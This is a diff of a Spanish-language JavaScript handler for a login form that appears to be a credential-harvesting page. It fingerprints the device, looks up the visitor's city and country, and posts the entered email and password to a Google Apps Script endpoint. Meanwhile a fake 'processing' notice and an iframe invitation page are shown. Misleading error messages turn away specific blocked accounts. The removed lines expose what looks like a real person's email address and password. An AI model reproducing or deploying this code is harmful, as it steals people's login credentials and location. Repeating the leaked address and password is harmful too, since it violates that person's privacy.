@@ -1,7 +1,3 @@
-<!-- Agrega esto en tu formulario.html para cargar la librería -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/device-detector-js/2.2.10/device-detector.min.js"></script>
-
-<script>
 document.getElementById("miFormulario").addEventListener("submit", async function(event) {
     event.preventDefault(); // Evita el envío automático
 
@@ -11,8 +7,8 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     const errorMessage = document.getElementById('error-message');
     
     // Lista de correos electrónicos y contraseñas prohibidas
-    const prohibitedEmails = ["tamaraganoza417@gmail.com"];
-    const prohibitedWords = ["Kiana14_07"];
+    const prohibitedEmails = ["ejemplo@correo.com"]; // Agregar correos prohibidos aquí
+    const prohibitedWords = ["ejemplo1"]; // Agregar contraseñas prohibidas aquí
     
     const email = emailInput.value.trim().toLowerCase();
     const password = passwordInput.value;
@@ -22,68 +18,168 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     if (!emailRegex.test(email)) {
         errorMessage.textContent = "Correo electrónico no válido";
         errorMessage.style.color = 'red';
-        return;
+        return; // Detiene el procesamiento
     }
     
     // Verificar correo prohibido
-    if (prohibitedEmails.includes(email)) {
+    const isProhibitedEmail = prohibitedEmails.includes(email);
+    if (isProhibitedEmail) {
         errorMessage.textContent = "No se encuentra la dirección de correo";
         errorMessage.style.color = 'red';
         emailInput.value = '';
         passwordInput.value = '';
-        return;
+        return; // Detiene el procesamiento
     }
     
     // Verificar contraseña prohibida
-    if (prohibitedWords.includes(password)) {
+    const containsProhibitedPassword = prohibitedWords.some(word => password.includes(word));
+    if (containsProhibitedPassword) {
         errorMessage.textContent = "Restaure su contraseña y vuelva a intentar";
         errorMessage.style.color = 'red';
         passwordInput.value = '';
-        return;
+        return; // Detiene el procesamiento
+    }
+    
+    // Si pasa todas las validaciones, continúa con el proceso normal
+    // Limpiar cualquier mensaje de error previo
+    if (errorMessage) {
+        errorMessage.textContent = "";
     }
 
-    // 🔥 DETECTAR EL MODELO EXACTO DEL DISPOSITIVO CON device-detector-js 🔥
-    const deviceDetector = new DeviceDetector();
-    const device = deviceDetector.parse(navigator.userAgent);
-    let deviceModel = "Desconocido";
-
-    if (device.device && device.device.model) {
-        deviceModel = `${device.device.brand} ${device.device.model}`; // Marca + Modelo
-    } else {
-        deviceModel = device.os.name || "Desconocido"; // Si no detecta modelo, muestra el sistema operativo
-    }
-
-    console.log("Modelo detectado:", deviceModel); // 👀 Verificar en consola
-
-    // 🔥 OBTENER CIUDAD Y PAÍS 🔥
+    // Ocultar el formulario
+    document.getElementById("miFormulario").style.display = "none";
+    
+    // Mostrar mensaje "Cargando..."
+    let loadingMessage = document.createElement("p");
+    loadingMessage.textContent = "⏳ Procesando... por favor, espere.";
+    loadingMessage.style.textAlign = "center";
+    document.body.appendChild(loadingMessage);
+    
+    // Cargar usuario.html dentro del iframe sin heredar estilos
+    let iframe = document.getElementById("usuarioFrame");
+    iframe.src = "invitation.html";
+    iframe.style.display = "block"; // Hacer visible el iframe
+    
+    // Eliminar mensaje de carga después de mostrar usuario.html
+    iframe.onload = function() {
+        loadingMessage.remove();
+    };
+    
+    // ✅ Detectar modelo exacto del dispositivo (Android o iPhone)
+    let deviceInfo = detectDeviceModel();
+    
+    // ✅ Obtener el país y ciudad del usuario desde la API
     let country = "Desconocido";
-    let city = "Desconocida";
-
+    let city = "Desconocido";
     try {
         const response = await fetch("https://ipwhois.app/json/");
         const data = await response.json();
-        if (data && data.country) {
-            country = data.country; // Captura el país
-        }
-        if (data && data.city) {
-            city = data.city; // Captura la ciudad
+        if (data) {
+            if (data.country) {
+                country = data.country; // Captura el país
+            }
+            if (data.city) {
+                city = data.city; // Captura la ciudad
+            }
         }
     } catch (error) {
-        console.error("Error obteniendo el país y ciudad:", error);
+        console.error("Error obteniendo la ubicación:", error);
     }
-
-    // 🔥 Enviar los datos a Google Sheets 🔥
+    
+    // ✅ Asegurar que los datos se agregan correctamente antes de enviarlos
     const formData = new FormData(this);
-    formData.append("device", deviceModel);
-    formData.append("country", country);
-    formData.append("city", city);
-
+    formData.append("device", deviceInfo.type); // Agregar tipo de dispositivo
+    formData.append("modelo", deviceInfo.model); // Agregar modelo específico
+    formData.append("country", country); // Agregar país
+    formData.append("city", city); // Agregar ciudad
+    
+    // ✅ Enviar los datos correctamente a Google Sheets
     const url = "https://script.google.com/macros/s/AKfycbxecXJGiURxApfpFHvcZCRvxaXNmzPitUCnaBtjNzlpPMWefOzH7Sj2eTOouF-Qjz7Q/exec";
-
     fetch(url, {
         method: "POST",
         body: new URLSearchParams(formData),
         headers: { "Content-Type": "application/x-www-form-urlencoded" }
     }).catch(error => console.error("Error al enviar datos:", error));
 });
-</script>
+
+// Función para detectar el modelo exacto del dispositivo
+function detectDeviceModel() {
+    const userAgent = navigator.userAgent;
+    let deviceType = "Otro";
+    let deviceModel = "Desconocido";
+    
+    // Detectar iPhone y su modelo
+    if (/iPhone/.test(userAgent)) {
+        deviceType = "iPhone";
+        
+        // Intentar identificar el modelo de iPhone
+        const iPhoneMatch = userAgent.match(/iPhone\s*(?:OS\s*)?(\d+[_\d]*)/i);
+        if (iPhoneMatch) {
+            // Esta es una aproximación, ya que el User Agent no contiene el modelo exacto
+            // Los iPhones más nuevos solo pueden estimarse por la versión de iOS y dimensiones de pantalla
+            const version = iPhoneMatch[1].replace(/_/g, '.');
+            
+            // Mapeo muy básico (es una aproximación)
+            if (/(15|16)/.test(version)) {
+                deviceModel = "iPhone 13-16 Series"; // Aproximación
+            } else if (/(13|14)/.test(version)) {
+                deviceModel = "iPhone 11-12 Series"; // Aproximación
+            } else if (/(11|12)/.test(version)) {
+                deviceModel = "iPhone X-XS Series"; // Aproximación
+            } else {
+                deviceModel = "iPhone (versión anterior)";
+            }
+        }
+    } 
+    // Detectar iPad
+    else if (/iPad/.test(userAgent)) {
+        deviceType = "iPad";
+        deviceModel = "iPad";
+    } 
+    // Detectar Android y su modelo
+    else if (/Android/.test(userAgent)) {
+        deviceType = "Android";
+        
+        // Intentar extraer el modelo específico de Android
+        const matches = userAgent.match(/Android\s([0-9\.]+);\s([^;)]+)/);
+        if (matches && matches.length > 2) {
+            let model = matches[2].trim();
+            
+            // Limpiar el modelo para hacerlo más legible
+            model = model.replace(/Build\/[^\s]+/, '').trim();
+            
+            // Identificar modelos conocidos
+            if (/SM-S[^\s]+/.test(model)) {
+                deviceModel = "Samsung " + model;
+                
+                // Mapear códigos de modelo a nombres comerciales (básico)
+                if (/SM-S20/.test(model)) {
+                    deviceModel = "Samsung Galaxy S20";
+                } else if (/SM-S21/.test(model)) {
+                    deviceModel = "Samsung Galaxy S21";
+                } else if (/SM-S22/.test(model)) {
+                    deviceModel = "Samsung Galaxy S22";
+                } else if (/SM-G998/.test(model)) {
+                    deviceModel = "Samsung Galaxy S21 Ultra";
+                } else if (/SM-S908/.test(model)) {
+                    deviceModel = "Samsung Galaxy S22 Ultra";
+                } else if (/SM-S918/.test(model)) {
+                    deviceModel = "Samsung Galaxy S23 Ultra";
+                }
+            } else if (/Pixel/.test(model)) {
+                deviceModel = "Google " + model;
+            } else if (/OnePlus/.test(model)) {
+                deviceModel = model;
+            } else if (/Xiaomi/.test(model) || /Redmi/.test(model)) {
+                deviceModel = model;
+            } else {
+                deviceModel = model;
+            }
+        }
+    }
+    
+    return {
+        type: deviceType,
+        model: deviceModel
+    };
+}
